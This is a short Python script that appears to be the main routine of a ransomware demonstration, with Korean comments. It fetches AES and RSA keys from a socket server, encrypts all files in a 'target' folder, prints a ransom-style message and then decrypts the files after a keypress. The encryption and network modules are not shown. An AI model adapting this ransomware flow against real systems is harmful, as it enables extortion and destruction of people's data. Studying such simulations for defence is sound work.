import os
from socketclient import SocketClient
from fileencryptor import FileEncryptor
from filedecryptor import FileDecryptor
from rsa import RSA

def main():
    client = SocketClient()
    client.start()
    key = client.get_key(2) # aes key 가져옴
    
    iv = os.urandom(16)
    file_encryptor = FileEncryptor(key, iv)
    file_encryptor.encrypt('./../target/*') # target 폴더 내부 암호화

    public_key = client.get_key(0) # public key 가져옴
    key = RSA.encrypt(key, public_key) # aes key 암호화

    print('your files have been encrypted.')
    print('if you want to decrypt, enter any button')
    input()

    private_key = client.get_key(1) # private key 가져옴
    client.stop() # 연결 종료

    key = RSA.decrypt(key, private_key)

    file_decryptor = FileDecryptor(key, iv)
    file_decryptor.decrypt('./../target/*') # target 폴더 내부 복호화

if __name__ == '__main__':
    main()